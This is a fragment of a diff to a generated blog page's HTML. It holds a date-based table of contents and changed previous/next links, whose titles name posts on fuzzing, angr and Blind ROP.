class="toc-text">2017-05-30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-06-29"><span class="toc-number">21.</span> <span class="toc-text">2017-06-29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-07-04"><span class="toc-number">22.</span> <span class="toc-text">2017-07-04</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-07-30"><span class="toc-number">23.</span> <span class="toc-text">2017-07-30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-08-20"><span class="toc-number">24.</span> <span class="toc-text">2017-08-20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-08-24"><span class="toc-number">25.</span> <span class="toc-text">2017-08-24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-09-26"><span class="toc-number">26.</span> <span class="toc-text">2017-09-26</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-10-27"><span class="toc-number">27.</span> <span class="toc-text">2017-10-27</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-12-30"><span class="toc-number">28.</span> <span class="toc-text">2017-12-30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2018-2-14"><span class="toc-number">29.</span> <span class="toc-text">2018-2-14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2018-2-28"><span class="toc-number">30.</span> <span class="toc-text">2018-2-28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2018-4-29"><span class="toc-number">31.</span> <span class="toc-text">2018-4-29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2018-6-9"><span class="toc-number">32.</span> <span class="toc-text">2018-6-9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2018-8-13"><span class="toc-number">33.</span> <span class="toc-text">2018-8-13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2018-11-10"><span class="toc-number">34.</span> <span class="toc-text">2018-11-10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2018-11-26"><span class="toc-number">35.</span> <span class="toc-text">2018-11-26</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
 
@@ -448,13 +493,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/08/26/初试winafl/" title="上一篇: 初试winafl">
+            <a href="/2017/01/30/Linux socket进程间通信及应用/" title="上一篇: Linux socket进程间通信及应用">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2016/08/01/简单的尝试angr/" title="下一篇: 简单的尝试angr">
+            <a href="/2017/01/22/Have-fun-with-Blind-ROP/" title="下一篇: Have fun with Blind ROP">
                 <i class="fa fa-angle-right"></i>
             </a>
         
